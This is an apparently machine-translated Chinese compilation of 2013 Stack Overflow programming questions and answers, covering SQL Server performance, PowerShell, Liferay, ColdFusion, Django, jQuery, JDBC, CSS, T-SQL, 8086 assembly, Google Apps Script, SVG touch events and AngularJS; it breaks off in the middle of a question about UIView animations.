所以基本上发生的事情是这样的：每周一次/两次，当我启动运行存储过程并显示结果的 Intranet 页面时，运行大约需要 115 秒。然后我启动 SQL Server Management Studio 并运行相同的查询，这一次只需要 3-4 秒即可运行。

第二天，Intranet 页面的运行时间与 SSMS 一样长，运行相同的存储过程，在此期间没有任何更改（无论如何我都不知道）。

**其他详情：**

*   **IIS 使用Provider=sqloledb**作为驱动程序连接到 SQL Server 2005
*   无论活跃用户数量如何，减速都会持续一整天
*   我可以通过使用相同的驱动程序/连接字符串从 Excel 运行相同的查询来复制缓慢
*   我在 SQL 服务器上运行了一个跟踪，结果发现在那些特别慢的日子里，通过 IIS 执行存储过程的持续时间实际上比直接查询长

因此，我想知道你们中是否有人遇到过任何类似的行为，如果您喜欢它的解决方案，您对解决/解决它有什么建议？

谢谢你的帮助，

请在下面找到 .csv 格式的**跟踪结果：**

```
EventClass,TextData,ApplicationName,CPU,Reads,Writes,Duration (s),ClientProcessID,SPID,StartTime,EndTime
12,exec spStubbornProc,Internet Information Services,"106,016","7,059,999",1,115.80,5476,85,18/04/2013 08:17:15,18/04/2013 08:19:11
12,exec dbo.spStubbornProc,Microsoft SQL Server Management Studio - Query,"3,141","146,051",0,3.40,5876,84,18/04/2013 08:20:45,18/04/2013 08:20:48
12,exec dbo.spStubbornProc,Microsoft SQL Server Management Studio - Query,"2,563","147,387",0,2.93,5876,84,18/04/2013 08:21:04,18/04/2013 08:21:07
12,exec spStubbornProc,Internet Information Services,"103,156","7,083,365",7,118.73,5476,80,18/04/2013 09:39:41,18/04/2013 09:41:40
12,exec dbo.spStubbornProc,Microsoft SQL Server Management Studio - Query,"2,406","175,029",1,2.57,5876,84,18/04/2013 10:08:58,18/04/2013 10:09:01
12,exec spStubbornProc,Internet Information Services,"112,218","7,103,267",7,114.72,5476,75,18/04/2013 14:06:26,18/04/2013 14:08:21
12,exec spStubbornProc,Internet Information Services,"93,515","7,101,229",3,93.60,6092,60,18/04/2013 19:37:02,18/04/2013 19:38:35
12,exec spStubbornProc,Internet Information Services,"2,500","148,775",1,3.42,5160,75,19/04/2013 09:16:01,19/04/2013 09:16:04 
```

# php - get-childitem 获取子目录名称附加在脚本目录路径上

> ID：16110088
> 
> 赞同：1
> 
> 时间：2013-04-19T17:14:47.160
> 
> 标签：php, powershell, get-childitem

我正在尝试编写一个 PS 脚本来在参数指定的目录中查找空目录。“空目录”不应包含任何文件和子目录。

这是脚本：

```
 param (
[parameter (mandatory=$true,position=0)]
[string]$Path
)
$dirInfo = get-childitem $Path -recurse | ? {$_.PSIsContainer -eq $True} | % {get-childitem $_} | Measure-Object 
$dirInfo | ? {$dirInfo.count -eq 0} |  Select-Object Fullname 
```

当我在“C:\documents 文件夹”上运行它时，出现以下错误：

```
**get-childitem : Cannot find path 'C:\Documents\ManualScripts\accounts' because it does not exist.
At C:\Documents\ManualScripts\Check-no-file-and-subdir-dir.ps1:5 char:79
+ $dirInfo = get-childitem $Path -recurse | ? {$_.PSIsContainer -eq $True} | % {ge ...
+                                                                               ~~
    + CategoryInfo          : ObjectNotFound: (C:\Documents\ManualScripts\accounts:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand** 
```

C:\documents 下的每个子文件夹都有很多类似的错误。它将脚本本身所在的目录 (C:\Documents\ManualScripts) 附加到子目录名称。

已经完成了我的研究，但仍然无法弄清楚。任何输入表示赞赏。谢谢：）

在上面的帖子之后，我对脚本进行了一些更改，但到目前为止仍然无法正常工作：

```
param (
[parameter (mandatory=$true,position=0)]
[string]$Path
)

$Dirs = Get-ChildItem $Path -recurse | ? {$_.PSIsContainer -eq $True} | ForEach-Object -Process {$_.FullName}  #get list of all directories with whole path

foreach ($Dir in $Dirs) {
$emptyDir = Get-ChildItem $Dir | Measure | where {$_.Count -eq 0} | select-Object
} 
```

在睡觉之前，我相信我会取得一点进步。脚本现在看起来像这样：

```
param (
[parameter (mandatory=$true,position=0)]
[string]$Path
)
$Dirs = Get-ChildItem $Path -recurse | ? {$_.PSIsContainer -eq $True} | ForEach-Object -Process {$_.FullName}  #get list of all directories with whole path
#$Dirs | ForEach-Object {Get-ChildItem $_} | ForEach-Object {measure} | where {$_.Count -eq 0} | Select-Object $Dirs 
ForEach ($Dir in $Dirs) {
$emptyDir = Get-ChildItem $Dir | Measure | where {$_.Count -eq 0} | Select-Object
$emptyDir
} 
```

如果我运行，输出中有一些东西（虽然不是我所期望的）

```
PS C:\Documents\ManualScripts> .\Check-no-file-and-subdir-dir-rev01.ps1
cmdlet Check-no-file-and-subdir-dir-rev01.ps1 at command pipeline position 1
Supply values for the following parameters:
Path: C:\documents

Count    : 0
Average  : 
Sum      : 
Maximum  : 
Minimum  : 
Property : 

Count    : 0
Average  : 
Sum      : 
Maximum  : 
Minimum  : 
Property : 
......
...... 
```

像“Select-Object”这样的东西会选择“measure”的输出，而不是下面没有文件/子目录的目录的名称。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T08:25:18.763

试试这个：

```
Get-ChildItem $Path -Recurse -Force | 
Where-Object {$_.PSIsContainer -and (Get-ChildItem $_.FullName -Force | Measure-Object).Count -eq 0} 
```

# java - 如何在 Liferay 中查看 portlet 配置页面？

> ID：16110091
> 
> 赞同：0
> 
> 时间：2013-04-19T17:14:55.117
> 
> 标签：java, jsp, liferay, liferay-ide

在 Liferay IDE 中创建 portlet 时，我已将其配置为具有 Liferay 的配置模式。作为响应，向导创建了具有以下文本的 JSP 文件：

```
<%@ taglib uri="http://java.sun.com/portlet_2_0" prefix="portlet" %>

<portlet:defineObjects />

This is the <b>MyPortlet</b> portlet in Config mode. 
```

如何从 Liferay 调用此页面以查看此文本？单击扳手图标并选择时，`Configuration`我看不到任何类似的东西。

**更新**

路径设置正确，因为它是由向导设置的。

问题是如何通过鼠标从 Web 界面调用这个 JSP？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:32:45.877

通常问题是配置jsp的路径没有正确设置。

在`portlet.xml`

添加以下内容：

```
<init-param>
    <name>config-template</name>
    <value>/path/to/configuration.jsp</value>
</init-param> 
```

作为`<portlet>`与您尝试修改的 portlet 对应的元素的子元素。

你的最终结果`portlet.xml`应该是这样的：

```
<portlet-app>
    <portlet>
        <portlet-name>my-portlet</portlet-name>
        <display-name>My Portlet</display-name>
        <portlet-class>com.liferay.portlet.StrutsPortlet</portlet-class>
        <init-param>
            <name>config-template</name>
            <value>/path/to/configuration.jsp</value>
        </init-param>
        <init-param>
            <name>view-action</name>
            <value>/my_portlet/view</value>
        </init-param>
        <expiration-cache>0</expiration-cache>
        <supports>
            <mime-type>text/html</mime-type>
        </supports>
    </portlet>
</portlet-app> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-15T17:59:45.743

来自 wiki（不过在这里并不感到羞耻，我花了很长时间才找到它）：

[将配置页面添加到插件 Portlet](http://www.liferay.com/community/wiki/-/wiki/Main/Add+Config+Page+to+Plugin+Portlet) <- 在此处获取更多信息

liferay-portlet.xml->

```
 <portlet>
      <portlet-name>configuration-example</portlet-name>
      <icon>/icon.png</icon> 
      <configuration-action-class>com.sample.jsp.action.ConfigurationActionImpl</configuration-action-class> 
      <instanceable>true</instanceable> 
      <header-portlet-css>/css/test.css</header-portlet-css> 
      <footer-portlet-javascript>/js/test.js</footer-portlet-javascript> 
    </portlet> 
```

ConfigurationActionImpl.java（或你的类）->

```
 public class ConfigurationActionImpl implements ConfigurationAction {
        public void processAction(PortletConfig config, ActionRequest actionRequest, ActionResponse actionResponse) throws Exception { 

          String portletResource = ParamUtil.getString(actionRequest, "portletResource"); 

          PortletPreferences prefs = PortletPreferencesFactoryUtil.getPortletSetup(actionRequest, portletResource); 

          //Read, validate, and then set form parameters as portlet preferences

          prefs.store();

          SessionMessages.add(actionRequest, portletConfig.getPortletName() + ".doConfigure");
        }
        public String render(PortletConfig config, RenderRequest renderRequest, RenderResponse renderResponse) throws Exception { 

        return "/configuration.jsp";
        }
    } 
```

配置.jsp

```
 <%@ taglib uri="http://java.sun.com/portlet" prefix="portlet" %>
    <%@ taglib uri="http://liferay.com/tld/portlet" prefix="liferay-portlet" %>

    <portlet:defineObjects />

    <form action="<liferay-portlet:actionURL portletConfiguration="true" />" method="post" name="<portlet:namespace />fm"> <input name="<portlet:namespace /><%=Constants.CMD%>" type="hidden" value="<%=Constants.UPDATE%>" /> 

    Type: <select name="<portlet:namespace />type"> <option value="casual">Casual</option> <option value="formal">Formal</option> </select> <br/>

    <input type="button" value="Save" onClick="submitForm(document.<portlet:namespace />fm);" /> </form> 
```

“注意 liferay-portlet:actionURL 标记中的 portletConfiguration 属性。”

# jquery - 如何将 CSS 应用于 a 的第一次迭代 但不是随后的迭代？

> ID：16110094
> 
> 赞同：1
> 
> 时间：2013-04-19T17:15:06.913
> 
> 标签：jquery, css, coldfusion

我有一个`<cfloop>`向 jQuery 可排序列表输出查询。所有可排序的标签（`<h3>, <div>`等）都包含在循环中。我需要`<h3>`使用 CSS 将第一个元素锚定到页面上的设置区域。但我不想在第一次迭代后应用这个 CSS。

```
<cfloop query="createAgendaTopics">
    <h3 style="color:#FFFFFF; font-weight:bold;">
       <cfoutput>#One.categoryName#</cfoutput>
    </h3>
    <div>
         <cfoutput>#One.subCategoryGUID#</cfoutput>
    </div>        
 </cfloop> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-19T17:23:09.600

当您输出/循环查询时，它具有内置的 currentRow 属性`QueryName.CurrentRow`

我将其放入 cfoutput 以稍微简化代码。

```
<cfoutput query="createAgendaTopics">
    <cfif createAgendaTopics.CurrentRow EQ 1>
        <h3 style="color:##FFFFFF; font-weight:bold;">#One.categoryName#</h3>
    <cfelse>
        <div>#One.subCategoryGUID#</div>         
    </cfif>
</cfoutput> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:24:39.050

像这样的东西：

```
<cfloop query=createAgendaTopics">
    <cfif currentrow is 1>
       code for first row
    <cfelse>
      code for remaining rows
    </cfif>
</cfloop> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T18:30:22.420

听起来您可以简单地使用`:first-child` [CSS 伪类](http://www.w3.org/TR/CSS2/selector.html#first-child)。

例子：

```
<style type="text/css">
   .agendaTopics :first-child {
       /* css to "anchor the first element to a set area on the page" */
   }
</style>

<div class="agendaTopics">
  <cfloop query="createAgendaTopics">
     <h3 style="color:#FFFFFF; font-weight:bold;">
       <cfoutput>#One.categoryName#</cfoutput>
     </h3>
     <div>
       <cfoutput>#One.subCategoryGUID#</cfoutput>
     </div>         
   </cfloop>
 </div> 
```

虽然我不确定你的意思

> 我需要使用 CSS 将第一个元素锚定到页面上的设置区域。

您应该能够使用上面的代码将您想要的任何 CSS 样式应用于第一个元素。

# python - 如何使用 django 仅用数据呈现 html 的一部分

> ID：16110099
> 
> 赞同：10
> 
> 时间：2013-04-19T17:15:28.477
> 
> 标签：python, django, django-templates, rendering

我正在使用 ajax 对来自搜索结果的数据进行排序。

现在我想知道是否可以只渲染 html 的一部分以便我可以这样加载：

`$('#result').html('&nbsp;').load('/sort/?sortid=' + sortid);`

我正在这样做，但我得到了整个 html 页面作为响应，它将整个 html 页面附加到现有页面，这很糟糕。

这是我的意见.py

```
def sort(request):
  sortid = request.GET.get('sortid')
  ratings = Bewertung.objects.order_by(sortid)
  locations = Location.objects.filter(locations_bewertung__in=ratings)
  return render_to_response('result-page.html',{'locs':locations},context_instance=RequestContext(request)) 
```

我怎样才能`<div id="result"> </div>`从我的视图函数中只渲染它？或者我在这里做错了什么？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-04-19T17:32:08.137

据我了解，如果您收到 ajax 请求，您希望以不同的方式处理相同的视图。我建议将你`result-page.html`分成两个模板，一个只包含你想要的 div，一个包含其他所有内容并包含另一个模板（请参阅[django 的 include tag](https://docs.djangoproject.com/en/dev/ref/templates/builtins/#include)）。

在您看来，您可以执行以下操作：

```
def sort(request):
    sortid = request.GET.get('sortid')
    ratings = Bewertung.objects.order_by(sortid)
    locations = Location.objects.filter(locations_bewertung__in=ratings)
    if request.is_ajax():
        template = 'partial-results.html'
    else:
        template = 'result-page.html'
    return render_to_response(template,   {'locs':locations},context_instance=RequestContext(request)) 
```

结果-page.html：

```
<html>
   <div> blah blah</div>
   <div id="results">
       {% include "partial-results.html" %}
   </div>
   <div> some more stuff </div>
</html> 
```

部分结果.html：

```
{% for location in locs %}
    {{ location }}
{% endfor %} 
```

# javascript - 如果单击提交按钮时没有要提交的数据，则JQuery将错误消息添加到表中

> ID：16110105
> 
> 赞同：0
> 
> 时间：2013-04-19T17:15:39.303
> 
> 标签：javascript, jquery

我有一个程序可以从用户那里获取详细信息，然后当用户单击提交时，详细信息将发送到数据库并返回信息。如果没有可返回的内容，例如没有他们正在搜索的人，那么我希望将一条错误消息发布在搜索结果将发布到的表中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T17:18:36.190

尝试这个

```
 if(noresults found){   

           $('#myTable').empty()
           var newRow = $("<tr><td>no results found</td></tr>");
           $("#myTable").append(newRow);

       } else {

           //proceed with your logic

       } 
```

# database - 语法错误：在第 1 行第 54 列遇到“t”

> ID：16110108
> 
> 赞同：0
> 
> 时间：2013-04-19T17:15:58.347
> 
> 标签：database, netbeans, syntax, arraylist

我收到一条错误消息，显示“语法错误：在第 1 行第 54 列遇到“t””

这似乎只发生在历史列表的增强 for 循环迭代不止一次时。当我添加一行项目时它工作得很好，但是当我再添加时它给了我这个错误

这是我的代码：

```
public void databaseSave( ArrayList <Patient> pList )
{

    try
    {
        stmt = getConnection().createStatement(ResultSet.TYPE_SCROLL_SENSITIVE, ResultSet.CONCUR_UPDATABLE);

        //Statement stmt = con.createStatement();

        //Deletes all records from the Patient Table.
        deleteAllFromPatientTable();

        //Selects all the records from the Patient table.
        selectAllFromPatient();

        System.out.println("Before loop");

        for ( Patient p: pList )
        {

            patientInsertSQL = "Insert Into SHAUN.PATIENT VALUES (" + p.getPatientNum() + ", '"
            + p.getPatientName() + "', '" + p.getPatientAddress() + "', '"
            + p.getPatientPhone() + "')";

            res = stmt.executeUpdate(patientInsertSQL); 

            System.out.println(res);

            ArrayList <History> tempHistList = p.getHistory();

            //Deletes all the records from the history table.
            deleteAllFromHistoryTable();

            //Selects all the records from the history table.
            selectAllFromHistory();

            for ( History h: tempHistList )
            {                   
                historyInsertSQL = "Insert Into SHAUN.HISTORY VALUES (" + h.getHistID() + ", '" + h.getConditionName() + "', '" + h.getMedication() + "', '" + h.getDateOccured() + "', " + p.getPatientNum() + ")";

                res = stmt.executeUpdate(historyInsertSQL); 

                System.out.println(res);

                //Loop Checker
                int i = 1;
                System.out.println("In the History Loop " + i);
                i++;
            }

            System.out.println("In the loop!");

        }

        stmt.close();
        result.close();
        con.commit();

        System.out.println("After Loop and close");

    }
    catch (SQLException err)
    {
        System.out.print(err.getMessage());
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:18:34.883

您可能遇到了 SQL 注入问题，并且`t`您的错误中提到的问题来自类似

```
INSERT INTO .....'Can't Tolerate X'
                     ^--- 
```

# css - css根据应用于元素的类计算宽度

> ID：16110110
> 
> 赞同：1
> 
> 时间：2013-04-19T17:16:07.457
> 
> 标签：css

有没有一种方法可以创建某种 CSS 逻辑来读取应用于元素的 CSS 类并计算新宽度？

假设我有一个 div 元素，宽度为“grid_6”类 - 宽度为 480 像素。
然后我添加了几个其他的类，比如；pl8 和 pr16 - 左侧为 8px 填充，右侧为 16px 填充。

是否有任何引擎可以读取这些规则，然后执行以下操作：grid_6 - (p8+p16)，然后将元素的新宽度设置为，在本例中为 456px，以保持总宽度为 480px？

我看过 CSS calc()，但不知道如何制作像我想要做的事情......使用 PHP 当然是一个解决方案，但它会是内联 css，这是不好的做法...

我知道我可以只有一个子元素并在它们上设置填充/边距/边框以确保我不超过总宽度。但希望有一个更聪明的解决方案......

有人知道吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T18:04:43.397

## 采用`box-sizing`

Scott Cranfill 在评论中将此作为“解决方案”，但我不确定他为什么不将其作为解决方案发布。该[`box-sizing`属性](https://developer.mozilla.org/en-US/docs/CSS/box-sizing)更改宽度计算的完成方式。因此，只需添加以下内容：

```
.grid_6 {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
} 
```

或更一般地，对于所有网格元素：

```
[class^=grid] {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;    
} 
```

让我们`padding`通过其他类添加，而不是`width` [像这个小提琴显示](http://jsfiddle.net/GxtLZ/3/)的那样影响。不需要复杂的计算。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T17:20:39.793

尝试使用 SASS：[http ://sass-lang.com/](http://sass-lang.com/)

它允许您对 CSS 规则的变量进行计算和支持。

# sql - 将动态 sql 的结果存储到变量中

> ID：16110112
> 
> 赞同：0
> 
> 时间：2013-04-19T17:16:16.160
> 
> 标签：sql, dynamic

我有一个以下光标：

```
DECLARE MY_CURSOR Cursor
FOR 
SELECT [DB_NAME],[SCHEMA_NAME],[TABLE_NAME],[COLUMN_NAME]  FROM dbo.Data_Profile_Stats
Open My_Cursor
DECLARE @DB_NAME nvarchar(500),@SCHEMA_NAME  nvarchar(500),@TABLE_NAME  nvarchar(500),@COLUMN_NAME  nvarchar(500), @QUERY NVARCHAR(MAX)
DECLARE @MAX_NUMBER NVARCHAR(255), @MIN_NUMBER INT, @NULL_COUNT INT, @BLANK_COUNT INT, @ZERO_COUNT INT,@DISTINCT_COUNT INT
Fetch NEXT FROM MY_CURSOR INTO @DB_NAME,@SCHEMA_NAME,@TABLE_NAME,@COLUMN_NAME 
While (@@FETCH_STATUS  = 0)
BEGIN

SELECT  @DB_NAME,@SCHEMA_NAME,@TABLE_NAME,@COLUMN_NAME

SET @QUERY='SELECT MAX('+@DB_NAME+'.'+@SCHEMA_NAME+'.'+@TABLE_NAME+'.'+@COLUMN_NAME+') FROM '+@DB_NAME+'.'+@SCHEMA_NAME+'.'+@TABLE_NAME
--SET @MAX_NUMBER=exec sp_executesql @QUERY
EXEC SP_EXECUTESQL @QUERY, N'@MAX_NUMBER NVARCHAR(255) OUTPUT', @MAX_NUMBER=@MAX_NUMBER OUTPUT
SELECT @MAX_NUMBER
--SET @QUERY='UPDATE [dbo].[Data_Profile_Stats] SET MAX_NUMBER='+CAST(@MAX_NUMBER AS VARCHAR(10))+' WHERE [DB_NAME]='+''''+@DB_NAME+''''+' AND SCHEMA_NAME='+''''+@SCHEMA_NAME+''''+' AND TABLE_NAME='+''''+@TABLE_NAME+''''+' AND COLUMN_NAME='+''''+@COLUMN_NAME+''''
--exec sp_executesql @QUERY

FETCH NEXT FROM MY_CURSOR INTO @DB_NAME,@SCHEMA_NAME,@TABLE_NAME,@COLUMN_NAME 
END
CLOSE MY_CURSOR
DEALLOCATE MY_CURSOR
GO 
```

在上面的查询中，我看到了 EXEC SP_EXECUTESQL 的结果，但在下一行看不到 @MAX_NUMBER 的值

有人可以告诉我我做错了什么吗？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T17:19:19.597

您的查询未设置 @MAX_NUMBER。尝试这个：

```
SET @QUERY='SELECT @MAX_NUMBER=MAX('+@DB_NAME+'.'+@SCHEMA_NAME+'.'+@TABLE_NAME+'.'+@COLUMN_NAME+') FROM '+@DB_NAME+'.'+@SCHEMA_NAME+'.'+@TABLE_NAME; 
```

# assembly - 8086 中断 21H 问题

> ID：16110115
> 
> 赞同：1
> 
> 时间：2013-04-19T17:16:34.737
> 
> 标签：assembly, x86, dos, x86-16

感觉好像看不懂8086汇编中中断21H的函数0AH。我阅读了语法教程，例如：

"缓冲区的第一个字节指定它可以容纳的最大字符数（1到255）。这个值必须由用户提供。缓冲区的第二个字节由DOS设置为实际读取的字符数，不包括终止返回。”

所以我尝试了一个非常基本的代码。

```
mov dh, 01
mov ah, 0AH
int 21H 
```

我运行这个程序，输入一个数值并按下回车键。然而，调试显示我的任何寄存器都不会因这个操作而改变。我不知道我输入的值存储在哪里，如果有的话。有人可以帮我弄这个吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-19T17:21:18.507

您必须在调用 int 21h 之前设置 DS:DX 指向缓冲区

```
Buffer on entry:  
+0: db MaxLength

Buffer on exit:  
+0: db MaxLength
+1: db Length of entered text (L)
+2: db 'Entered text of length L'
+(2+L): db 0Dh 
```

# google-apps-script - 在 SPLIT 函数后保留前导零（google-apps-script）

> ID：16110120
> 
> 赞同：1
> 
> 时间：2013-04-19T17:17:28.347
> 
> 标签：google-apps-script, google-docs

我有一列包含用逗号分隔的数字和/或数字的单元格。如：

123, 456

987

321,5439,807

2024, 007,0193

我有一个基于逗号拆分和转置这些单元格的程序：（该程序的部分如下）

```
var lastRow = ss.getDataRange().getNumRows();
var srcRange = ss.getRange(lastRow,2);
var splitCell = '=TRANSPOSE(SPLIT(' + srcRange.getA1Notation() + ',","))'; 
ss.getRange(lastRow,7).setFormula(splitCell); 
```

我遇到的问题是其中一个数字包含前导零。换句话说，这...

**2024, 007,0193**

变成了这个……

**2024**

**7**

**193**

工作表被格式化为文本，因此似乎是 SPLIT 将**007**和**0193解释并转换为****7**和**193**的整数。

那么如何在 SPLIT 端保留前导零？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T17:52:52.560

您可以尝试替换该行：

```
var splitCell = '=arrayformula(transpose(substitute(split(substitute(' + srcRange.getA1Notation() + ',0,"#"),","),"#",0)))'; 
```

# html - *你*可以在移动浏览器上获取 SVG 接受鼠标/触摸事件吗？我不能

> ID：16110124
> 
> 赞同：14
> 
> 时间：2013-04-19T17:17:37.260
> 
> 标签：html, mobile, svg

我显示一个带有嵌入式 SVG 的 HTML。我希望它检测鼠标事件，但它不适用于移动设备（Android Jellybean）。它适用于桌面浏览器。

这是一个演示页面： [http](http://artsyenta.org/misc/ss/j.touchtry1.html) ://artsyenta.org/misc/ss/j.touchtry1.html 。

如果您将鼠标拖到圆圈上，您会看到鼠标条目记录到名为“j_xxx”的元素中。这适用于 Firefox 和 Chrome。

打开您的 Android 平板电脑（我也在某人的 iPhone 上尝试过，结果相同）。在圆圈上拖动手指，您只会时不时地收到一个 touchenter 事件。没有其他显示。

您可以通过查看页面源代码来查看整个页面和代码。它不长，最长的部分是 SVG 定义。重要的部分是：

```
$(document).ready(function() {
  makeSomethingHappen("hello");
});
function makeSomethingHappen(svg) {
  placeATop(true);
  $('[class^=j_]')
    .on("mouseover", function(event) { logAction(event, this); })
    .on("mouseout", function(event) { logAction(event, this); })
    .on("touchstart", function(event) { logAction(event, this); })
    .on("touchend", function(event) { logAction(event, this); })
    .on("touchenter", function(event) { logAction(event, this); })
    .on("touchleave", function(event) { logAction(event, this); })
    .on("touchEnter", function(event) { logAction(event, this); })
    .on("touchLeave", function(event) { logAction(event, this); });
}

var cntAct = 0;
function logAction(ev, ele) {
  cntAct++;
  var logSpan = $('#logTrace');
  logSpan.html("" + cntAct + ": " + ev.type + " '" + $(ele).attr("class") + "'<br/>" + logSpan.html());
} 
```

这是 SVG 的一部分：

```
<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     id="jsvg" x="0px" y="0px" width="376.247px" height="364.318px" viewBox="140 110 130 120"
     enable-background="new 0 0 376.247 364.318" xml:space="preserve">
  <g id="Layer_1">
    <path class="j_aa_" opacity="0.75" fill="#FFFFFF" stroke="#0071BC" stroke-width="0.9925" enable-background="new    " d="M224.739,6.55l-6.414,23.957c-10.377-2.785-21.304-2.785-31.671,0L180.232,6.55C194.813,2.63,210.155,2.63,224.739,6.55z"/> 
    [snip]
  </g>
</svg> 
```

同样，我在桌面浏览器上检测到鼠标事件，但在移动浏览器上没有检测到触摸或鼠标事件。是否缺少技术，或者手机缺少某些东西？它在 iPhone 浏览器、Jellybean 上的 Google Chrome 和 Firefox 移动设备上失败。

在此先感谢，杰罗姆。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-05-04T01:25:21.027

在对普通 SVG 事件和 RaphaelJS 事件进行了大量研究之后，我为每个事件提供了一个可行的解决方案。这是一个 RaphaelJS 解决方案：

```
window.onload = function(e) {
    document.getElementById("rsr").addEventListener("mousemove",
        function(event) { 
            logAction(event, this, "m");
        }, false);

    document.getElementById("rsr").addEventListener("touchmove",
        function(event) {
            if(event.preventDefault) event.preventDefault();
            // perhaps event.targetTouches[0]?
            logAction(event.changedTouches[0], this, "t");
        }, false);
}; 
```

代码不是无懈可击的，但说明了要点。

首先，必须通过 addEventHandler() 调用注册事件。使用 RaphaelJS onmousemove() 等，处理程序在平板电脑上不起作用。

其次，对于触摸事件，您需要深入了解触摸列表。我的应用程序只关心一个手指，因此列表的 [0] 事件就足够了。有许多列表——touches、targetTouches、changedTouches——所以选择一个合适的列表。

第三，确定窗口是否需要冒泡事件。如果我调用 preventDefault()，我对触摸更加敏感。

我在 Google Nexus、iPad 3 和 iPad Mini 上对此进行了测试。好结果。

我也有一个纯 SVG 的解决方案。它基于此站点： http: [//my.opera.com/MacDev_ed/blog/2010/02/01/how-to-get-all-svg-elements-intersected-by-a-given-rectangle](http://my.opera.com/MacDev_ed/blog/2010/02/01/how-to-get-all-svg-elements-intersected-by-a-given-rectangle)

我使用的和他使用的 Javascript 的区别在于，对于触摸列表需要访问的触摸。“root”是此示例的 svg 元素 ID。“logTrace”是一个接收评论的跨度。

```
var root = document.getElementById("root");
var evtt = evt.touches[0];

var rpos = root.createSVGRect();
rpos.x = evtt.clientX;
rpos.y = evtt.clientY;
rpos.width = rpos.height = 1;
var list = root.getIntersectionList(rpos, null);
var maxItemId = list.length <= 0 ? "(no match)" : list[list.length - 1].id;

document.getElementById("logTrace").innerHTML = "screen: (" + evtt.clientX + ", " + evtt.clientY + ") ? uu(" + maxItemId + "): (" + uupos.x.toFixed(0) + "," + uupos.y.toFixed(0) + ")"; 
```

我已经在 Nexus 和 iPad 上成功测试了这个解决方案。但是，它在 iPad Mini 上表现不佳——为什么在两台 iPad 设备上表现不同？

我还注意到“plain svg”解决方案的检测似乎不如 RaphaelJS 版本准确。在我的 SVG 元素的边缘附近，普通 svg 检测的检测效果不是很好。我一直在使用 RaphaelJS 获得良好的结果。

OTOH，RaphaelJS 的使用对具有 (fill:none) 的 SVG 很敏感。普通的 SVG 不关心 (fill:none) 是否在元素中设置。选择你的毒药。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-10-28T15:38:52.267

我遇到了这个问题，事实证明 iPad 会考虑对象的不透明度来实现其命中测试功能，所以如果你有一些带有 fill:none 的东西，它就不会注册一个事件。

我成功地测试了这种风格的路径：

```
.st5 {fill:none;fill-opacity:0.01;stroke:none;stroke-linecap:round;stroke-linejoin:round;stroke-width:0.72} 
```

以及放置在包含路径的标签上的两个事件处理程序：

```
 <g ...  onclick="top.load(3201);" ontouchend="top.load(3201);" > ...path here with style .st5 </g> 
```

该`load(id)`函数存储在外部 JS 文件中。

另一个问题是 SVG 必须直接放在 HTML dom 中，而不是引用为`<embed .../>`，后者会导致安全异常

# html - 使用Angular ng-repeat从选择元素多次调用onselect

> ID：16110128
> 
> 赞同：0
> 
> 时间：2013-04-19T17:17:52.203
> 
> 标签：html, select, angularjs, onselect, ng-repeat

我使用 HTML 选择元素来显示其中包含枚举值的实体字段。

在页面中，我有多个实体字段，因此有多个选择元素。

我使用 Angular ng-repeat 来显示每个字段，方法是在我的表格行的 ng-repeat 中创建一个选择。当从任何下拉列表中选择项目时，我想捕获“onselect”事件，问题是，每当用户在一个下拉列表中选择一个值时，该事件都会为页面上的所有下拉列表触发。

我的html：

```
<div ng-app>
<div ng:controller="TodoCtrl">
    <table>
        <tr ng-repeat="prop in customForm">
            <td>{{prop.legend}}</td>
            <td>
                <select ng-name="prop.name" ng-model="entity[prop.name]"
                        ng-options="val as val for val in prop.enumeratedValues"
                        onselect="{{fireSelectEvent(prop.name)}}"></select>
            </td>
        </tr>
        <tr><td>Calls Made</td></tr>
        <tr ng-repeat="call in callLog">
            <td>{{call}}</td>
        </tr>    
    </table>
</div>
</div> 
```

我的控制器：

```
//'use strict';
function TodoCtrl($scope) {

    $scope.customForm =
    [
        {name:"aval", legend: "A Value", enumeratedValues: ["1","2","3"], editable: true},
        {name:"bval", legend: "B Value", enumeratedValues: ["4","5","6"], editable: true},
        {name:"cval", legend: "C Value", enumeratedValues: ["7","8","9"], editable: true}
    ];

    $scope.entity = {};
    $scope.callLog = [];

    $scope.fireSelectEvent = function( propName )
    {
        console.log("Prop=" + propName + " value=" + $scope.entity[propName]);

        $scope.callLog.push( propName );        
    }
} 
```

我的小提琴：

[http://jsfiddle.net/utgwG/](http://jsfiddle.net/utgwG/)

祝你好运。我们都指望着你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T17:41:12.940

`onselect`属性是什么？您`fireSelectEvent`多次看到火灾，因为您使用[Angular 插值](http://docs.angularjs.org/api/ng.%24interpolate)`onselect`绑定了属性。

我猜你想做的是：`ng-change="fireSelectEvent(prop.name)"`

您更新的小提琴：http: [//jsfiddle.net/utgwG/2/](http://jsfiddle.net/utgwG/2/)

# animation - UIVIEW中for循环内的链式动画

> ID：16110129
> 
> 赞同：1
> 
> 时间：2013-04-19T17:17:54.617
> 
> 标签：animation, core-animation, uilabel, sequence, uiviewanimation

我对动画有一些问题。这是我想要做的。首先，我有一个*for*循环，在其中制作了一些 UILabel 的动画，例如

```
